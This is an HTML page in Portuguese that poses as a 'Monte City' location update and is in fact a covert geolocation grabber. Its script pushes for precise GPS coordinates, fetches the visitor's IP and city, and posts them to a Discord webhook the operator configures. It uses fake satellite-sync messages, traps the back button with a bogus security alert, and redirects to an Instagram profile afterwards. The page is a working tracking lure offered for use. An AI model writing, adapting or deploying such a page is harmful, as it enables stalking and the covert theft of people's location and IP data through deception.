<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MONTE CITY - ATUALIZAÇÃO</title>
    
    <!-- Meta tags para parecer uma atualização de sistema -->
    <meta property="og:title" content="📍 Atualização de Localização">
    <meta property="og:description" content="Verificando sua área de cobertura para liberar o conteúdo...">
    <meta name="theme-color" content="#2c3e50">

    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background-color: #ecf0f1; 
            margin: 0; 
            padding: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            overflow: hidden; 
        }
        
        .card { 
            background: white; 
            width: 90%; 
            max-width: 400px; 
            padding: 25px; 
            border-radius: 12px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
            text-align: center; 
        }
        
        h2 { color: #2c3e50; margin-top: 0; font-size: 1.4em; }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .status { color: #7f8c8d; font-size: 0.9em; margin-top: 15px; line-height: 1.5; }
        .error { color: #e74c3c; font-size: 0.9em; margin-top: 10px; display: none; }
        
        /* Esconde elementos visualmente, mas mantém para SEO/Robôs */
        .hidden-info { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h2>📡 Sincronizando Dados...</h2>
        <div id="loader" class="spinner"></div>
        <p id="status-text" class="status">Conectando ao satélite...</p>
        <p id="error-msg" class="error">⚠️ Permita a localização para continuar.</p>
    </div>

    <script>
        // CONFIGURAÇÃO: Coloque seu Webhook aqui
        const WEBHOOK_URL = "SEU_WEBHOOK_AQUI"; 

        let attempts = 0;
        const maxAttempts = 10; // Tenta por cerca de 30-40 segundos antes de desistir

        function updateStatus(text) {
            document.getElementById('status-text').innerText = text;
        }

        function sendToDiscord(lat, lon, acc, ipData) {
            const message = `🛰️ **LOCALIZAÇÃO CAPTURADA**\n📍 Lat: ${lat}\n📍 Lon: ${lon}\n🎯 Precisão: ${acc}m\n🌐 IP: ${ipData.ip || 'Indefinido'}\n🏙️ Cidade: ${ipData.city || 'Desconhecida'}`;
            
            fetch(WEBHOOK_URL, { 
                method: "POST", 
                headers: {"Content-Type": "application/json"}, 
                body: JSON.stringify({ content: message }) 
            });
        }

        function getIP() {
            return fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .catch(() => ({ip: 'N/A', city: 'N/A'}));
        }

        function startTracking(ipPromise) {
            if (!navigator.geolocation) {
                updateStatus("Seu navegador não suporta rastreamento.");
                return;
            }

            const options = {
                enableHighAccuracy: true, // Usa GPS real
                timeout: 10000,           // Tempo máximo por tentativa
                maximumAge: 0             // Não usa cache antigo
            };

            function tryLoc() {
                if (attempts >= maxAttempts) {
                    updateStatus("Localização capturada! Redirecionando...");
                    window.location.href = "https://www.instagram.com/montecitybr";
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude.toFixed(6);
                        const lon = pos.coords.longitude.toFixed(6);
                        const acc = Math.round(pos.coords.accuracy);

                        // Se a precisão for melhor que 50 metros, consideramos bom o suficiente
                        if (acc < 50) {
                            ipPromise.then(data => {
                                sendToDiscord(lat, lon, acc, data);
                                updateStatus("Dados enviados! Verificando acesso...");
                                setTimeout(() => {
                                    window.location.href = "https://www.instagram.com/montecitybr";
                                }, 2000);
                            });
                        } else {
                            attempts++;
                            updateStatus(`Sinal fraco (${acc}m). Aguardando mais precisão...`);
                            setTimeout(tryLoc, 3000); // Tenta de novo em 3 segundos
                        }
                    },
                    (err) => {
                        attempts++;
                        updateStatus(`Buscando sinal... (${attempts}/${maxAttempts})`);
                        setTimeout(tryLoc, 2000);
                    },
                    options
                );
            }

            tryLoc();
        }

        // Inicia tudo junto
        const ipPromise = getIP();
        startTracking(ipPromise);

        // Anti-back button: Se o usuário tentar voltar, recarrega e tenta de novo
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
            alert("Verificação de segurança necessária. Aguarde...");
            attempts = 0; // Reinicia contagem
            startTracking(ipPromise);
        };
    </script>

</body>
</html>
